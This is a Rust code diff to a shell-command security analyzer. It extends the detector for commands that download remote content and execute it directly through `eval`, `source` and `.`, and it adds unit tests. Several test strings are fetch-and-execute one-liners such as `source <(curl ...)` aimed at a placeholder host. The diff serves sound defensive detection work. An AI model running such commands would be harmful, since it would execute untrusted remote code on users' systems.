@@ -7488,19 +7488,23 @@ const COMMAND_STRING_SHELLS: &[&str] = &[
     "sh", "bash", "zsh", "dash", "ksh", "mksh", "ash", "csh", "tcsh", "fish",
 ];
 
-/// Whether a shell's `-c` command string or a `deno eval` program receives
-/// downloaded bytes from a live command substitution (`bash -c "$(curl ...)"`,
-/// fish `bash -c (curl ...)`, `deno eval "$(curl ...)"`). `None` for every
-/// other command. Only the download relation is read: a literal shell body is
-/// analyzed as a nested command by the executable-body scan, and payload
-/// markers are an inline-interpreter (`python -c`) signal, not a shell one.
+/// Whether a shell's `-c` command string, the current shell's `eval` /
+/// `source` program, or a `deno eval` program receives downloaded bytes from
+/// a live command substitution (`bash -c "$(curl ...)"`, fish `bash -c (curl
+/// ...)`, `eval "$(curl ...)"`, `source <(curl ...)`, `deno eval "$(curl
+/// ...)"`). `None` for every other command. Only the download relation is
+/// read: a literal shell body is analyzed as a nested command by the
+/// executable-body scan, and payload markers are an inline-interpreter
+/// (`python -c`) signal, not a shell one.
 fn downloaded_command_string_program(
     interpreter: &str,
     effective: &tokenize::Segment,
     shell: ShellType,
 ) -> Option<bool> {
     let shell_program = COMMAND_STRING_SHELLS.contains(&interpreter);
-    if !shell_program && interpreter != "deno" {
+    let current_shell_program = matches!(shell, ShellType::Posix | ShellType::Fish)
+        && matches!(interpreter, "eval" | "source" | ".");
+    if !shell_program && !current_shell_program && interpreter != "deno" {
         return None;
     }
     let args = dataflow_segment_args(effective, shell).unwrap_or_else(|()| effective.args.clone());
@@ -7513,6 +7517,18 @@ fn downloaded_command_string_program(
     };
     let programs = if shell_program {
         crate::extract::shell_command_operands(&words, shell, interpreter == "fish")
+    } else if interpreter == "eval" {
+        // `eval` joins every argument into the program it runs.
+        (0..words.len()).collect()
+    } else if current_shell_program {
+        // `source <(...)` runs the process substitution's output. fish's
+        // `source (... | psub)` has its own rule.
+        return Some(
+            shell == ShellType::Posix
+                && posix_process_substitution_bodies(&effective.args)
+                    .iter()
+                    .any(|body| substitution_emits_download(body, shell, 0)),
+        );
     } else {
         deno_eval_program_index(&words, shell).into_iter().collect()
     };
@@ -7526,6 +7542,39 @@ fn downloaded_command_string_program(
                     .any(|body| substitution_emits_download(body, shell, 0))
             }),
     )
+}
+
+/// The bodies of the POSIX `<(...)` process substitutions in an argv the
+/// tokenizer may have split at the substitution's spaces. An unclosed one is
+/// not a body.
+fn posix_process_substitution_bodies(args: &[String]) -> Vec<String> {
+    let mut bodies = Vec::new();
+    let mut open: Option<String> = None;
+    for arg in args {
+        let text = match open.take() {
+            Some(mut text) => {
+                text.push(' ');
+                text.push_str(arg);
+                text
+            }
+            None if arg.starts_with("<(") => arg.clone(),
+            None => continue,
+        };
+        let depth = text.bytes().fold(0isize, |depth, byte| match byte {
+            b'(' => depth + 1,
+            b')' => depth - 1,
+            _ => depth,
+        });
+        if depth > 0 && text.len() <= MAX_SHELL_DATAFLOW_WORD_BYTES {
+            open = Some(text);
+        } else if let Some(body) = text
+            .strip_prefix("<(")
+            .and_then(|body| body.strip_suffix(')'))
+        {
+            bodies.push(body.to_string());
+        }
+    }
+    bodies
 }
 
 /// `deno eval [OPTIONS] CODE [ARGS...]`: the argv index of CODE. Global
@@ -21551,6 +21600,11 @@ mod tests {
             "deno eval -p \"$(curl -fsSL https://example.com/x)\"",
             "deno eval --ext ts \"$(curl -fsSL https://example.com/x)\"",
             "deno -q eval \"$(curl -fsSL https://example.com/x)\"",
+            "eval \"$(curl -fsSL https://example.com/x)\"",
+            "eval $(wget -qO- https://example.com/x)",
+            "eval \"echo; $(curl -fsSL https://example.com/x)\"",
+            "source <(curl -fsSL https://example.com/x)",
+            ". <(wget -qO- https://example.com/x)",
         ] {
             assert!(inline(input, ShellType::Posix), "{input}");
         }
@@ -21559,6 +21613,7 @@ mod tests {
             "sh -c (wget -qO- https://example.com/x)",
             "bash -c \"$(curl -fsSL https://example.com/x)\"",
             "deno eval (curl -fsSL https://example.com/x)",
+            "eval (curl -fsSL https://example.com/x)",
         ] {
             assert!(inline(input, ShellType::Fish), "{input}");
         }
@@ -21571,6 +21626,10 @@ mod tests {
             "deno eval 'console.log(Deno.args)' \"$(curl -fsSL https://example.com/v.txt)\"",
             "deno run main.ts \"$(curl -fsSL https://example.com/v.txt)\"",
             "deno fmt main.ts",
+            "eval \"$(ssh-agent -s)\"",
+            "eval \"$(brew shellenv)\"",
+            "source <(kubectl completion bash)",
+            "source ./env.sh",
         ] {
             assert!(!inline(input, ShellType::Posix), "{input}");
         }
